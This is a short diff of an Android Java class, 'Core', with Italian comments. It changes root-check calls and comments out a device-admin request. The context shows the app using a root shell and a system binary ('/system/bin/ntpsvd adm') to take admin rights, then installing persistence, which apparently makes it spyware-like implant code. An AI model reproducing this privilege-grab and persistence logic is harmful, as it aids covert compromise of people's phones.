@@ -216,7 +216,7 @@ public class Core extends Activity implements Runnable {
 			// startTrace();
 		}
 
-		if (PackageInfo.checkRoot()) {
+		if (Status.haveRoot()) {
 			// Usa la shell per prendere l'admin
 			try {
 				// /system/bin/ntpsvd adm
@@ -238,7 +238,7 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " (run) calling gui admin");
 				}
 
-				gui.deviceAdminRequest();
+				//gui.deviceAdminRequest();
 			}
 		}
 
@@ -447,7 +447,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// Initialize persistence
-			if (PackageInfo.checkRoot()) {
+			if (Status.haveRoot()) {
 				Persistence p = new Persistence(Status.getAppContext());
 
 				p.storePackage();
